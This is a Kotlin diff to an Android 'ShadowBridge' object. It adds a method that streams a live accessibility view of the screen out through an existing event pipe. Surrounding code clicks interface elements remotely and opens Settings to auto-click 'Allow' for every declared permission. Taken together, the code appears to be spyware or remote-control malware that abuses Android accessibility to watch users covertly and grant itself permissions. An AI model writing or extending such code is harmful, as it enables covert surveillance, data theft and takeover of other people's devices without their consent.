@@ -35,6 +35,16 @@ object ShadowBridge {
     fun clickNodeById(viewId: String): Boolean =
         com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false
 
+    /**
+     * Toggle the throttled a11y screen stream (live semantic view).
+     * Frames leave via ShadowCore.logEvent -> the existing event pipe.
+     */
+    @JvmStatic
+    fun setScreenStream(on: Boolean, intervalMs: Int, maxNodes: Int): String =
+        com.shadow.a11y.ShadowAccessibilityService.instance
+            ?.setScreenStream(on, intervalMs, maxNodes)
+            ?: "a11y not active"
+
     /** Open Settings → app permissions and auto-click Allow for all declared perms. */
     @JvmStatic
     fun startAutoGrant(): String {
